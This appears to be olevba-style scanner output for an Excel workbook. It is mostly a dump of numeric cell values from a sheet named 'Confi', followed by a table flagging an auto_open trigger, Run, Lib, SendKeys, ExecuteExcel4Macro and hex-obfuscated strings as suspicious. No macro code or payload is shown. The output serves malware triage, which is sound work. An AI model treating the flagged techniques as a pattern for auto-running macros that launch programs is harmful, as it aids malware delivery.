'  Confi,CE25,"",0.98699999999999998845
'  Confi,CH25,"",0.63300000000000000711
'  Confi,CI25,"",0.48799999999999998934
'  Confi,CJ25,"",0.29399999999999998357
'  Confi,CK25,"",0.23500015258789061501
'  Confi,CL25,"",0.18099999999999999423
'  Confi,CM25,"",0.11799999999999999378
'  Confi,I26,"",5.00000000000000000000
'  Confi,K26,"",0.33100000000000001643
'  Confi,L26,"",0.33100000000000001643
'  Confi,M26,"",0.27600000000000002309
'  Confi,N26,"",0.24000015258789061945
'  Confi,O26,"",0.20399999999999998690
'  Confi,P26,"",0.13800000000000001155
'  Confi,S26,"",0.03599999999999999728
'  Confi,T26,"",0.02400000000000000050
'  Confi,U26,"",0.01899999999999999953
'  Confi,CA26,"",5.00000000000000000000
'  Confi,CC26,"",0.33100000000000001643
'  Confi,CD26,"",0.33100000000000001643
'  Confi,CE26,"",0.27600000000000002309
'  Confi,CF26,"",0.24000015258789061945
'  Confi,CG26,"",0.20399999999999998690
'  Confi,CH26,"",0.13800000000000001155
'  Confi,CK26,"",0.03599999999999999728
'  Confi,CL26,"",0.02400000000000000050
'  Confi,CM26,"",0.01899999999999999953
'  Confi,I27,"",5.00000000000000000000
'  Confi,M27,"",1.25400000000000000355
'  Confi,P27,"",0.97699999999999997957
'  Confi,Q27,"",0.83399999999999996358
'  Confi,R27,"",0.66400000000000003464
'  Confi,S27,"",0.51900000000000001688
'  Confi,T27,"",0.39200000000000001510
'  Confi,U27,"",0.27500015258789062278
'  Confi,CA27,"",5.00000000000000000000
'  Confi,CE27,"",1.25400000000000000355
'  Confi,CH27,"",0.97699999999999997957
'  Confi,CI27,"",0.83399999999999996358
'  Confi,CJ27,"",0.66400000000000003464
'  Confi,CK27,"",0.51000030517578121003
'  Confi,CL27,"",0.39200000000000001510
'  Confi,CM27,"",0.27500015258789062278
'  Confi,I29,"",1.00000000000000000000
'  Confi,K29,"",0.26600000000000001421
'  Confi,L29,"",0.26600000000000001421
'  Confi,M29,"",0.22200000000000000289
'  Confi,N29,"",0.20399999999999998690
'  Confi,O29,"",0.18000015258789062167
'  Confi,P29,"",0.15599999999999999978
'  Confi,Q29,"",0.10199999999999999345
'  Confi,R29,"",0.06600000000000000311
'  Confi,S29,"",0.05700000000000000205
'  Confi,T29,"",0.04800000000000000100
'  Confi,U29,"",0.03300000000000000155
'  Confi,CA29,"",1.00000000000000000000
'  Confi,CC29,"",0.26600000000000001421
'  Confi,CD29,"",0.26600000000000001421
'  Confi,CE29,"",0.22200000000000000289
'  Confi,CF29,"",0.20399999999999998690
'  Confi,CG29,"",0.18000015258789062167
'  Confi,CH29,"",0.15599999999999999978
'  Confi,CI29,"",0.10199999999999999345
'  Confi,CJ29,"",0.06600000000000000311
'  Confi,CK29,"",0.05700000000000000205
'  Confi,CL29,"",0.04800000000000000100
'  Confi,CM29,"",0.03300000000000000155
'  Confi,I30,"",2.00000000000000000000
'  Confi,K30,"",0.18699999999999999956
'  Confi,L30,"",0.18699999999999999956
'  Confi,M30,"",0.15599999999999999978
'  Confi,N30,"",0.14399999999999998912
'  Confi,O30,"",0.12600000000000000089
'  Confi,P30,"",0.10799999999999999878
'  Confi,Q30,"",0.07199999999999999456
'  Confi,R30,"",0.04800000000000000100
'  Confi,S30,"",0.04100000000000000172
'  Confi,T30,"",0.03500001907348632840
'  Confi,U30,"",0.02299999999999999961
'  Confi,CA30,"",1.00000000000000000000
'  Confi,CC30,"",0.64600000000000001865
'  Confi,CD30,"",0.64600000000000001865
'  Confi,CE30,"",0.51600000000000001421
'  Confi,CF30,"",0.45400000000000001465
'  Confi,CG30,"",0.36399999999999999023
'  Confi,CH30,"",0.31600000000000000311
'  Confi,CI30,"",0.25500015258789060502
'  Confi,CJ30,"",0.20599999999999998868
'  Confi,CK30,"",0.13400000000000000799
'  Confi,CL30,"",0.11500007629394531916
'  Confi,CM30,"",0.09700000000000000289
'  Confi,I31,"",3.00000000000000000000
'  Confi,K31,"",0.16800000000000001044
'  Confi,L31,"",0.16800000000000001044
'  Confi,O31,"",0.11300000000000000322
'  Confi,P31,"",0.09700000000000000289
'  Confi,Q31,"",0.06500003814697265236
'  Confi,R31,"",0.04299999999999999656
'  Confi,S31,"",0.03699999999999999817
'  Confi,T31,"",0.03099999999999999978
'  Confi,U31,"",0.02100000000000000130
'  Confi,CA31,"",2.00000000000000000000
'  Confi,CC31,"",0.18699999999999999956
'  Confi,CD31,"",0.18699999999999999956
'  Confi,CE31,"",0.15599999999999999978
'  Confi,CF31,"",0.14399999999999998912
'  Confi,CG31,"",0.12600000000000000089
'  Confi,CH31,"",0.10799999999999999878
'  Confi,CI31,"",0.07199999999999999456
'  Confi,CJ31,"",0.04800000000000000100
'  Confi,CK31,"",0.04100000000000000172
'  Confi,CL31,"",0.03500001907348632840
'  Confi,CM31,"",0.02299999999999999961
'  Confi,I32,"",4.00000000000000000000
'  Confi,K32,"",0.15700000000000000067
'  Confi,L32,"",0.15700000000000000067
'  Confi,M32,"",0.13100000000000000533
'  Confi,N32,"",0.12099999999999999645
'  Confi,O32,"",0.10599999999999999700
'  Confi,P32,"",0.09099999999999999756
'  Confi,Q32,"",0.06099999999999999867
'  Confi,T32,"",0.02900000000000000147
'  Confi,U32,"",0.02000001907348632896
'  Confi,CA32,"",2.00000000000000000000
'  Confi,CC32,"",0.45400000000000001465
'  Confi,CD32,"",0.45400000000000001465
'  Confi,CE32,"",0.36299999999999998934
'  Confi,CH32,"",0.21900000000000000022
'  Confi,CI32,"",0.14599999999999999090
'  Confi,CJ32,"",0.09700000000000000289
'  Confi,CK32,"",0.08300000000000000433
'  Confi,CL32,"",0.07099999999999999367
'  Confi,CM32,"",0.04700000000000000011
'  Confi,I33,"",5.00000000000000000000
'  Confi,K33,"",0.22300000000000000377
'  Confi,L33,"",0.22300000000000000377
'  Confi,M33,"",0.18599999999999999867
'  Confi,N33,"",0.16800000000000001044
'  Confi,O33,"",0.15599999999999999978
'  Confi,P33,"",0.13200000000000000622
'  Confi,Q33,"",0.08400000000000000522
'  Confi,R33,"",0.05399999999999999939
'  Confi,S33,"",0.04800000000000000100
'  Confi,T33,"",0.04100000000000000172
'  Confi,U33,"",0.02800000000000000058
'  Confi,CA33,"",3.00000000000000000000
'  Confi,CC33,"",0.16800000000000001044
'  Confi,CD33,"",0.16800000000000001044
'  Confi,CG33,"",0.11300000000000000322
'  Confi,CH33,"",0.09700000000000000289
'  Confi,CI33,"",0.06500003814697265236
'  Confi,CJ33,"",0.04299999999999999656
'  Confi,CK33,"",0.03699999999999999817
'  Confi,CL33,"",0.03099999999999999978
'  Confi,CM33,"",0.02100000000000000130
'  Confi,CA34,"",3.00000000000000000000
'  Confi,CC34,"",0.40799999999999997380
'  Confi,CD34,"",0.40799999999999997380
'  Confi,CE34,"",0.32600000000000001199
'  Confi,CF34,"",0.28899999999999997913
'  Confi,CG34,"",0.22800000000000000822
'  Confi,CH34,"",0.18599999999999999867
'  Confi,CI34,"",0.13200000000000000622
'  Confi,CJ34,"",0.08699999999999999400
'  Confi,CK34,"",0.07500003814697266125
'  Confi,CL34,"",0.06300000000000000044
'  Confi,CM34,"",0.04299999999999999656
'  Confi,I35,"",1.00000000000000000000
'  Confi,M35,"",0.03500001907348632840
'  Confi,N35,"",0.03219999999999999946
'  Confi,O35,"",0.02659999999999999865
'  Confi,P35,"",0.02380000000000000171
'  Confi,Q35,"",0.02100000000000000130
'  Confi,R35,"",0.01750000953674316420
'  Confi,S35,"",0.01400000000000000029
'  Confi,T35,"",0.01050000000000000065
'  Confi,U35,"",0.00670000000000000023
'  Confi,V35,"",0.00350000000000000007
'  Confi,CA35,"",4.00000000000000000000
'  Confi,CC35,"",0.15700000000000000067
'  Confi,CD35,"",0.15700000000000000067
'  Confi,CE35,"",0.13100000000000000533
'  Confi,CF35,"",0.12099999999999999645
'  Confi,CG35,"",0.10599999999999999700
'  Confi,CH35,"",0.09099999999999999756
'  Confi,CI35,"",0.06099999999999999867
'  Confi,CL35,"",0.02900000000000000147
'  Confi,CM35,"",0.02000001907348632896
'  Confi,I36,"",2.00000000000000000000
'  Confi,M36,"",0.03500001907348632840
'  Confi,N36,"",0.03219999999999999946
'  Confi,O36,"",0.02659999999999999865
'  Confi,P36,"",0.02380000000000000171
'  Confi,Q36,"",0.02100000000000000130
'  Confi,R36,"",0.01750000953674316420
'  Confi,S36,"",0.01400000000000000029
'  Confi,T36,"",0.01050000000000000065
'  Confi,U36,"",0.00670000000000000023
'  Confi,V36,"",0.00350000000000000007
'  Confi,CA36,"",4.00000000000000000000
'  Confi,CC36,"",0.38100000000000000533
'  Confi,CD36,"",0.38100000000000000533
'  Confi,CE36,"",0.30500015258789064942
'  Confi,CF36,"",0.26900000000000001688
'  Confi,CG36,"",0.21500015258789062500
'  Confi,CH36,"",0.18399999999999999689
'  Confi,CI36,"",0.12299999999999999822
'  Confi,CJ36,"",0.08100000000000000255
'  Confi,CK36,"",0.07099999999999999367
'  Confi,CL36,"",0.05899999999999999689
'  Confi,CM36,"",0.04000003814697265792
'  Confi,I37,"",3.00000000000000000000
'  Confi,M37,"",0.03500001907348632840
'  Confi,N37,"",0.03219999999999999946
'  Confi,O37,"",0.02659999999999999865
'  Confi,P37,"",0.02380000000000000171
'  Confi,Q37,"",0.02100000000000000130
'  Confi,R37,"",0.01750000953674316420
'  Confi,S37,"",0.01400000000000000029
'  Confi,T37,"",0.01050000000000000065
'  Confi,U37,"",0.00670000000000000023
'  Confi,V37,"",0.00350000000000000007
'  Confi,CA37,"",5.00000000000000000000
'  Confi,CC37,"",0.22300000000000000377
'  Confi,CD37,"",0.22300000000000000377
'  Confi,CE37,"",0.18599999999999999867
'  Confi,CF37,"",0.16800000000000001044
'  Confi,CG37,"",0.15599999999999999978
'  Confi,CH37,"",0.13200000000000000622
'  Confi,CI37,"",0.08400000000000000522
'  Confi,CJ37,"",0.05399999999999999939
'  Confi,CK37,"",0.04800000000000000100
'  Confi,CL37,"",0.04100000000000000172
'  Confi,CM37,"",0.02800000000000000058
'  Confi,I38,"",4.00000000000000000000
'  Confi,M38,"",0.03500001907348632840
'  Confi,N38,"",0.03219999999999999946
'  Confi,O38,"",0.02659999999999999865
'  Confi,P38,"",0.02380000000000000171
'  Confi,Q38,"",0.02100000000000000130
'  Confi,R38,"",0.01750000953674316420
'  Confi,S38,"",0.01400000000000000029
'  Confi,T38,"",0.01050000000000000065
'  Confi,U38,"",0.00670000000000000023
'  Confi,V38,"",0.00350000000000000007
'  Confi,CA38,"",5.00000000000000000000
'  Confi,CE38,"",0.36799999999999999378
'  Confi,CF38,"",0.31800000000000000488
'  Confi,CG38,"",0.26800000000000001599
'  Confi,CH38,"",0.22700000000000000733
'  Confi,CI38,"",0.15099999999999999534
'  Confi,CJ38,"",0.10000007629394530584
'  Confi,CK38,"",0.08300000000000000433
'  Confi,CL38,"",0.07099999999999999367
'  Confi,CM38,"",0.04800000000000000100
'  Confi,I39,"",5.00000000000000000000
'  Confi,M39,"",0.03500001907348632840
'  Confi,N39,"",0.03219999999999999946
'  Confi,O39,"",0.02659999999999999865
'  Confi,P39,"",0.02380000000000000171
'  Confi,Q39,"",0.02100000000000000130
'  Confi,R39,"",0.01750000953674316420
'  Confi,S39,"",0.01400000000000000029
'  Confi,T39,"",0.01050000000000000065
'  Confi,U39,"",0.00670000000000000023
'  Confi,V39,"",0.00350000000000000007
'  Confi,CA40,"",1.00000000000000000000
'  Confi,CE40,"",0.04059999999999999720
'  Confi,CF40,"",0.03740000000000000269
'  Confi,CG40,"",0.03090000000000000038
'  Confi,CH40,"",0.02759999999999999953
'  Confi,CI40,"",0.02440000000000000155
'  Confi,CJ40,"",0.02029999999999999860
'  Confi,CK40,"",0.01619999999999999912
'  Confi,CL40,"",0.01220000000000000077
'  Confi,CM40,"",0.00779999999999999964
'  Confi,CN40,"",0.00489999999999999984
'  Confi,I41,"",1.00000000000000000000
'  Confi,K41,"",0.14360000000000000542
'  Confi,L41,"",0.14360000000000000542
'  Confi,M41,"",0.11970000000000000084
'  Confi,N41,"",0.10710000000000000075
'  Confi,O41,"",0.09450000000000000067
'  Confi,P41,"",0.06300000000000000044
'  Confi,Q41,"",0.05530000000000000193
'  Confi,R41,"",0.04410000000000000031
'  Confi,S41,"",0.03150000000000000022
'  Confi,T41,"",0.02210000000000000159
'  Confi,U41,"",0.01580000000000000154
'  Confi,V41,"",0.00869999999999999940
'  Confi,CA41,"",2.00000000000000000000
'  Confi,CE41,"",0.04059999999999999720
'  Confi,CF41,"",0.03740000000000000269
'  Confi,CG41,"",0.03090000000000000038
'  Confi,CH41,"",0.02759999999999999953
'  Confi,CI41,"",0.02440000000000000155
'  Confi,CJ41,"",0.02029999999999999860
'  Confi,CK41,"",0.01619999999999999912
'  Confi,CL41,"",0.01220000000000000077
'  Confi,CM41,"",0.00779999999999999964
'  Confi,CN41,"",0.00489999999999999984
'  Confi,I42,"",2.00000000000000000000
'  Confi,K42,"",0.09829999999999999849
'  Confi,L42,"",0.09829999999999999849
'  Confi,M42,"",0.08190000000000000058
'  Confi,N42,"",0.07560000000000000053
'  Confi,O42,"",0.06300000000000000044
'  Confi,P42,"",0.04410000000000000031
'  Confi,Q42,"",0.03919999999999999873
'  Confi,R42,"",0.03090000000000000038
'  Confi,S42,"",0.02210000000000000159
'  Confi,T42,"",0.01580000000000000154
'  Confi,U42,"",0.01129999999999999928
'  Confi,V42,"",0.00630000000000000004
'  Confi,CA42,"",3.00000000000000000000
'  Confi,CE42,"",0.04059999999999999720
'  Confi,CF42,"",0.03740000000000000269
'  Confi,CG42,"",0.03090000000000000038
'  Confi,CH42,"",0.02759999999999999953
'  Confi,CI42,"",0.02440000000000000155
'  Confi,CJ42,"",0.02029999999999999860
'  Confi,CK42,"",0.01619999999999999912
'  Confi,CL42,"",0.01220000000000000077
'  Confi,CM42,"",0.00779999999999999964
'  Confi,CN42,"",0.00489999999999999984
'  Confi,I43,"",3.00000000000000000000
'  Confi,K43,"",0.09320000000000000506
'  Confi,L43,"",0.09320000000000000506
'  Confi,M43,"",0.07810000000000000275
'  Confi,N43,"",0.07180000000000000271
'  Confi,O43,"",0.05990000000000000185
'  Confi,P43,"",0.04220000000000000140
'  Confi,Q43,"",0.03710000000000000103
'  Confi,R43,"",0.02960000000000000131
'  Confi,S43,"",0.02079999999999999905
'  Confi,T43,"",0.01510000000000000057
'  Confi,U43,"",0.01069999999999999944
'  Confi,V43,"",0.00570000000000000021
'  Confi,CA43,"",4.00000000000000000000
'  Confi,CE43,"",0.04059999999999999720
'  Confi,CF43,"",0.03740000000000000269
'  Confi,CG43,"",0.03090000000000000038
'  Confi,CH43,"",0.02759999999999999953
'  Confi,CI43,"",0.02440000000000000155
'  Confi,CJ43,"",0.02029999999999999860
'  Confi,CK43,"",0.01619999999999999912
'  Confi,CL43,"",0.01220000000000000077
'  Confi,CM43,"",0.00779999999999999964
'  Confi,CN43,"",0.00489999999999999984
'  Confi,I44,"",4.00000000000000000000
'  Confi,K44,"",0.09320000000000000506
'  Confi,L44,"",0.09320000000000000506
'  Confi,M44,"",0.07810000000000000275
'  Confi,N44,"",0.07180000000000000271
'  Confi,O44,"",0.05990000000000000185
'  Confi,P44,"",0.04220000000000000140
'  Confi,Q44,"",0.03710000000000000103
'  Confi,R44,"",0.02960000000000000131
'  Confi,S44,"",0.02079999999999999905
'  Confi,T44,"",0.01510000000000000057
'  Confi,U44,"",0.01069999999999999944
'  Confi,V44,"",0.00570000000000000021
'  Confi,CA44,"",5.00000000000000000000
'  Confi,CE44,"",0.04059999999999999720
'  Confi,CF44,"",0.03740000000000000269
'  Confi,CG44,"",0.03090000000000000038
'  Confi,CH44,"",0.02759999999999999953
'  Confi,CI44,"",0.02440000000000000155
'  Confi,CJ44,"",0.02029999999999999860
'  Confi,CK44,"",0.01619999999999999912
'  Confi,CL44,"",0.01220000000000000077
'  Confi,CM44,"",0.00779999999999999964
'  Confi,CN44,"",0.00489999999999999984
'  Confi,I45,"",5.00000000000000000000
'  Confi,K45,"",0.13439999999999999170
'  Confi,L45,"",0.13439999999999999170
'  Confi,M45,"",0.10080000000000000071
'  Confi,N45,"",0.09450000000000000067
'  Confi,O45,"",0.08190000000000000058
'  Confi,P45,"",0.05360000000000000181
'  Confi,Q45,"",0.04689999999999999725
'  Confi,R45,"",0.03780000000000000027
'  Confi,S45,"",0.02709999999999999909
'  Confi,T45,"",0.01580000000000000154
'  Confi,U45,"",0.01389999999999999916
'  Confi,V45,"",0.00770000000000000025
'  Confi,I46,"",1.00000000000000000000
'  Confi,K46,"",0.12600000000000000089
'  Confi,L46,"",0.12600000000000000089
'  Confi,M46,"",0.10500007629394531028
'  Confi,N46,"",0.09099999999999999756
'  Confi,O46,"",0.07000003814697265681
'  Confi,P46,"",0.04760000000000000342
'  Confi,Q46,"",0.04130000000000000338
'  Confi,R46,"",0.03150000000000000022
'  Confi,S46,"",0.02520000000000000018
'  Confi,T46,"",0.01609999999999999973
'  Confi,U46,"",0.01329999999999999932
'  Confi,V46,"",0.00700000000000000015
'  Confi,CA46,"",1.00000000000000000000
'  Confi,CC46,"",0.17540000000000000036
'  Confi,CD46,"",0.17540000000000000036
'  Confi,CE46,"",0.14619999999999999662
'  Confi,CF46,"",0.12989999999999998770
'  Confi,CG46,"",0.10960000000000000298
'  Confi,CH46,"",0.09529999999999999583
'  Confi,CI46,"",0.07330000000000000404
'  Confi,CJ46,"",0.05639999999999999875
'  Confi,CK46,"",0.04340000000000000108
'  Confi,CL46,"",0.03339999999999999913
'  Confi,CM46,"",0.02570000000000000062
'  Confi,I47,"",2.00000000000000000000
'  Confi,K47,"",0.15120000000000000107
'  Confi,L47,"",0.15120000000000000107
'  Confi,M47,"",0.12600000000000000089
'  Confi,N47,"",0.11200000000000000233
'  Confi,O47,"",0.08400000000000000522
'  Confi,P47,"",0.05600000000000000117
'  Confi,Q47,"",0.04900000000000000189
'  Confi,R47,"",0.03710000000000000103
'  Confi,S47,"",0.03080000000000000099
'  Confi,T47,"",0.02309999999999999901
'  Confi,U47,"",0.01609999999999999973
'  Confi,V47,"",0.00830000000000000009
'  Confi,CA47,"",2.00000000000000000000
'  Confi,CC47,"",0.11400000000000000411
'  Confi,CD47,"",0.11400000000000000411
'  Confi,CE47,"",0.09500007629394531528
'  Confi,CF47,"",0.08770000000000000018
'  Confi,CG47,"",0.07309999999999999831
'  Confi,CH47,"",0.06350000000000000089
'  Confi,CI47,"",0.04889999999999999902
'  Confi,CJ47,"",0.03760000000000000148
'  Confi,CK47,"",0.02889999999999999861
'  Confi,CL47,"",0.02220000000000000098
'  Confi,CM47,"",0.01710000000000000062
'  Confi,I48,"",3.00000000000000000000
'  Confi,K48,"",0.10570000000000000229
'  Confi,L48,"",0.10570000000000000229
'  Confi,M48,"",0.08820000000000000062
'  Confi,N48,"",0.07839999999999999747
'  Confi,O48,"",0.05879999999999999810
'  Confi,P48,"",0.04059999999999999720
'  Confi,Q48,"",0.03919999999999999873
'  Confi,R48,"",0.02589999999999999941
'  Confi,S48,"",0.02100000000000000130
'  Confi,T48,"",0.01609999999999999973
'  Confi,U48,"",0.01119999999999999989
'  Confi,V48,"",0.00670000000000000023
'  Confi,CA48,"",3.00000000000000000000
'  Confi,CC48,"",0.10810000000000000164
'  Confi,CD48,"",0.10810000000000000164
'  Confi,CE48,"",0.09059999999999999998
'  Confi,CF48,"",0.08329999999999999905
'  Confi,CG48,"",0.06950000000000000622
'  Confi,CH48,"",0.06040000000000000230
'  Confi,CI48,"",0.04649999999999999967
'  Confi,CJ48,"",0.03579999999999999849
'  Confi,CK48,"",0.02750001907348632868
'  Confi,CL48,"",0.02120000000000000009
'  Confi,CM48,"",0.01629999999999999852
'  Confi,I49,"",4.00000000000000000000
'  Confi,K49,"",0.10570000000000000229
'  Confi,L49,"",0.10570000000000000229
'  Confi,M49,"",0.08820000000000000062
'  Confi,N49,"",0.07839999999999999747
'  Confi,O49,"",0.05879999999999999810
'  Confi,P49,"",0.04059999999999999720
'  Confi,Q49,"",0.03919999999999999873
'  Confi,R49,"",0.02589999999999999941
'  Confi,S49,"",0.02100000000000000130
'  Confi,T49,"",0.01609999999999999973
'  Confi,U49,"",0.01119999999999999989
'  Confi,V49,"",0.00670000000000000023
'  Confi,CA49,"",4.00000000000000000000
'  Confi,CC49,"",0.10810000000000000164
'  Confi,CD49,"",0.10810000000000000164
'  Confi,CE49,"",0.09059999999999999998
'  Confi,CF49,"",0.08329999999999999905
'  Confi,CG49,"",0.06950000000000000622
'  Confi,CH49,"",0.06040000000000000230
'  Confi,CI49,"",0.04649999999999999967
'  Confi,CJ49,"",0.03579999999999999849
'  Confi,CK49,"",0.02750001907348632868
'  Confi,CL49,"",0.02120000000000000009
'  Confi,CM49,"",0.01629999999999999852
'  Confi,I50,"",5.00000000000000000000
'  Confi,K50,"",0.10080000000000000071
'  Confi,L50,"",0.10080000000000000071
'  Confi,M50,"",0.08400000000000000522
'  Confi,N50,"",0.07420000000000000207
'  Confi,O50,"",0.05600000000000000117
'  Confi,P50,"",0.03849999999999999950
'  Confi,Q50,"",0.03710000000000000103
'  Confi,R50,"",0.02450000000000000094
'  Confi,S50,"",0.02029999999999999860
'  Confi,T50,"",0.01540000000000000049
'  Confi,U50,"",0.01050000000000000065
'  Confi,V50,"",0.00610000000000000039
'  Confi,CA50,"",5.00000000000000000000
'  Confi,CC50,"",0.15590000000000001079
'  Confi,CD50,"",0.15590000000000001079
'  Confi,CE50,"",0.11690000000000000391
'  Confi,CF50,"",0.10960000000000000298
'  Confi,CG50,"",0.09500007629394531528
'  Confi,CH50,"",0.08260000000000000675
'  Confi,CI50,"",0.06350000000000000089
'  Confi,CJ50,"",0.04889999999999999902
'  Confi,CK50,"",0.03760000000000000148
'  Confi,CL50,"",0.02889999999999999861
'  Confi,CM50,"",0.02220000000000000098
'  Confi,CA51,"",1.00000000000000000000
'  Confi,CC51,"",0.15790000000000001257
'  Confi,CD51,"",0.15790000000000001257
'  Confi,CE51,"",0.13150000000000000577
'  Confi,CF51,"",0.11690000000000000391
'  Confi,CG51,"",0.09869999999999999607
'  Confi,CH51,"",0.08580000000000000127
'  Confi,CI51,"",0.06600000000000000311
'  Confi,CJ51,"",0.05079999999999999793
'  Confi,CK51,"",0.03899999999999999994
'  Confi,CL51,"",0.03000001907348632743
'  Confi,CM51,"",0.02309999999999999901
'  Confi,CA52,"",2.00000000000000000000
'  Confi,CC52,"",0.10259999999999999676
'  Confi,CD52,"",0.10259999999999999676
'  Confi,CE52,"",0.08550000000000000655
'  Confi,CF52,"",0.07889999999999999791
'  Confi,CG52,"",0.06579999999999999738
'  Confi,CH52,"",0.05720000000000000084
'  Confi,CI52,"",0.04399999999999999745
'  Confi,CJ52,"",0.03379999999999999671
'  Confi,CK52,"",0.02599999999999999881
'  Confi,CL52,"",0.02000001907348632896
'  Confi,CM52,"",0.01540000000000000049
'  Confi,CA53,"",3.00000000000000000000
'  Confi,CC53,"",0.09729999999999999760
'  Confi,CD53,"",0.09729999999999999760
'  Confi,CE53,"",0.08150000000000000300
'  Confi,CH53,"",0.05439999999999999697
'  Confi,CI53,"",0.04179999999999999688
'  Confi,CJ53,"",0.03219999999999999946
'  Confi,CK53,"",0.02479999999999999913
'  Confi,CL53,"",0.01899999999999999953
'  Confi,CM53,"",0.01460000000000000013
'  Confi,I54,"",1.00000000000000000000
'  Confi,CA54,"",4.00000000000000000000
'  Confi,CC54,"",0.09729999999999999760
'  Confi,CD54,"",0.09729999999999999760
'  Confi,CE54,"",0.08150000000000000300
'  Confi,CH54,"",0.05439999999999999697
'  Confi,CI54,"",0.04179999999999999688
'  Confi,CJ54,"",0.03219999999999999946
'  Confi,CK54,"",0.02479999999999999913
'  Confi,CL54,"",0.01899999999999999953
'  Confi,CM54,"",0.01460000000000000013
'  Confi,I55,"",2.00000000000000000000
'  Confi,CA55,"",5.00000000000000000000
'  Confi,CC55,"",0.14030000000000000804
'  Confi,CD55,"",0.14030000000000000804
'  Confi,CE55,"",0.10520000000000000184
'  Confi,CF55,"",0.09869999999999999607
'  Confi,CG55,"",0.08550000000000000655
'  Confi,CH55,"",0.07439999999999999392
'  Confi,CI55,"",0.05720000000000000084
'  Confi,CJ55,"",0.04399999999999999745
'  Confi,CK55,"",0.03379999999999999671
'  Confi,CL55,"",0.02599999999999999881
'  Confi,CM55,"",0.02000001907348632896
'  Confi,I56,"",3.00000000000000000000
'  Confi,I57,"",4.00000000000000000000
'  Confi,I58,"",5.00000000000000000000
'  Confi,CA59,"",1.00000000000000000000
'  Confi,CA60,"",2.00000000000000000000
'  Confi,CA61,"",3.00000000000000000000
'  Confi,I62,"",1.00000000000000000000
'  Confi,CA62,"",4.00000000000000000000
'  Confi,I63,"",2.00000000000000000000
'  Confi,CA63,"",5.00000000000000000000
'  Confi,I64,"",3.00000000000000000000
'  Confi,I65,"",4.00000000000000000000
'  Confi,I66,"",5.00000000000000000000
'  Confi,CA66,"",3.00000000000000000000
'  Confi,CA67,"",4.00000000000000000000
'  Confi,CA68,"",5.00000000000000000000
'  Confi,I70,"",1.00000000000000000000
'  Confi,I71,"",2.00000000000000000000
'  Confi,CA71,"",3.00000000000000000000
'  Confi,I72,"",3.00000000000000000000
'  Confi,K72,"",0.25200000000000000178
'  Confi,L72,"",0.25200000000000000178
'  Confi,M72,"",0.24000015258789061945
'  Confi,N72,"",0.12199999999999999734
'  Confi,O72,"",0.07900000000000000078
'  Confi,P72,"",0.07299999999999999545
'  Confi,Q72,"",0.06700000000000000400
'  Confi,R72,"",0.06099999999999999867
'  Confi,S72,"",0.05600000000000000117
'  Confi,T72,"",0.05099999999999999672
'  Confi,CA74,"",5.00000000000000000000
'  Confi,I76,"",1.00000000000000000000
'  Confi,I77,"",2.00000000000000000000
'  Confi,CA77,"",4.00000000000000000000
'  Confi,I78,"",3.00000000000000000000
'  Confi,CA78,"",5.00000000000000000000
'  Confi,I82,"",1.00000000000000000000
'  Confi,CA82,"",1.00000000000000000000
'  Confi,I83,"",2.00000000000000000000
'  Confi,CA83,"",2.00000000000000000000
'  Confi,I84,"",3.00000000000000000000
'  Confi,CA84,"",3.00000000000000000000
'  Confi,I85,"",4.00000000000000000000
'  Confi,CA85,"",4.00000000000000000000
'  Confi,I86,"",5.00000000000000000000
'  Confi,CA86,"",5.00000000000000000000
'  Confi,I90,"",1.00000000000000000000
'  Confi,CA90,"",1.00000000000000000000
'  Confi,I91,"",2.00000000000000000000
'  Confi,CA91,"",2.00000000000000000000
'  Confi,I92,"",3.00000000000000000000
'  Confi,CA92,"",3.00000000000000000000
'  Confi,CC92,"",0.25200000000000000178
'  Confi,CD92,"",0.25200000000000000178
'  Confi,CE92,"",0.24000015258789061945
'  Confi,CF92,"",0.12199999999999999734
'  Confi,CG92,"",0.07900000000000000078
'  Confi,CH92,"",0.07299999999999999545
'  Confi,CI92,"",0.06700000000000000400
'  Confi,CJ92,"",0.06099999999999999867
'  Confi,CK92,"",0.05600000000000000117
'  Confi,CL92,"",0.05099999999999999672
'  Confi,I93,"",4.00000000000000000000
'  Confi,I94,"",5.00000000000000000000
'  Confi,CA96,"",1.00000000000000000000
'  Confi,CA97,"",2.00000000000000000000
'  Confi,I98,"",1.00000000000000000000
'  Confi,CA98,"",3.00000000000000000000
'  Confi,I99,"",2.00000000000000000000
'  Confi,I100,"",3.00000000000000000000
'  Confi,I101,"",4.00000000000000000000
'  Confi,I102,"",5.00000000000000000000
'  Confi,CA102,"",1.00000000000000000000
'  Confi,CA103,"",2.00000000000000000000
'  Confi,CA104,"",3.00000000000000000000
'  Confi,CA105,"",4.00000000000000000000
'  Confi,I106,"",1.00000000000000000000
'  Confi,CA106,"",5.00000000000000000000
'  Confi,I107,"",2.00000000000000000000
'  Confi,I108,"",3.00000000000000000000
'  Confi,I109,"",4.00000000000000000000
'  Confi,I110,"",5.00000000000000000000
'  Confi,CA110,"",1.00000000000000000000
'  Confi,CA111,"",2.00000000000000000000
'  Confi,CA112,"",3.00000000000000000000
'  Confi,I113,"",1.00000000000000000000
'  Confi,CA113,"",4.00000000000000000000
'  Confi,I114,"",2.00000000000000000000
'  Confi,CA114,"",5.00000000000000000000
'  Confi,I115,"",3.00000000000000000000
'  Confi,I116,"",4.00000000000000000000
'  Confi,I117,"",5.00000000000000000000
'  Confi,CA118,"",1.00000000000000000000
'  Confi,CA119,"",2.00000000000000000000
'  Confi,CA120,"",3.00000000000000000000
'  Confi,CA121,"",4.00000000000000000000
'  Confi,CA122,"",5.00000000000000000000
'  Confi,CA126,"",1.00000000000000000000
'  Confi,CA127,"",2.00000000000000000000
'  Confi,CA128,"",3.00000000000000000000
'  Confi,CA129,"",4.00000000000000000000
'  Confi,CA130,"",5.00000000000000000000
'  Confi,CA133,"",1.00000000000000000000
'  Confi,CA134,"",2.00000000000000000000
'  Confi,CA135,"",3.00000000000000000000
'  Confi,CA136,"",4.00000000000000000000
'  Confi,CA137,"",5.00000000000000000000
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
